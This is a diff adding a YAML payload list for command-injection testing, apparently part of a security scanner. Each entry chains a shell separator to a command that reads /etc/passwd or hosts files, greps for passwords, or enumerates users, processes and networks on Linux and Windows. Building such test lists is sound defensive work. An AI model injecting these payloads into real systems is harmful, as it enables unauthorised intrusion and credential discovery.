@@ -1,0 +1,38 @@
+name: "Command Injection"
+vulnerability_type: "command_injection"
+description: "Command injection payloads for various operating systems"
+base_payloads:
+  # Linux/Unix commands
+  - "; cat /etc/passwd"
+  - "| whoami"
+  - "&& id"
+  - "`uname -a`"
+  - "$(cat /etc/hosts)"
+  - "; ls -la /"
+  - "| ps aux"
+  - "&& netstat -an"
+  - "; find / -name '*.conf' 2>/dev/null"
+  - "| grep -r 'password' /etc/ 2>/dev/null"
+  # Windows commands
+  - "; type C:\\Windows\\System32\\drivers\\etc\\hosts"
+  - "| dir C:\\"
+  - "&& whoami"
+  - "; net user"
+  - "| ipconfig /all"
+  - "&& systeminfo"
+  - "; tasklist"
+  - "| netstat -an"
+  # Time-based detection
+  - "; sleep 5"
+  - "| ping -c 4 127.0.0.1"
+  - "&& timeout 5"
+variations:
+  - "127.0.0.1"
+  - "localhost"
+  - "google.com"
+encodings:
+  - "url"
+  - "hex"
+obfuscations:
+  - "whitespace_insertion"
+  - "mutation"
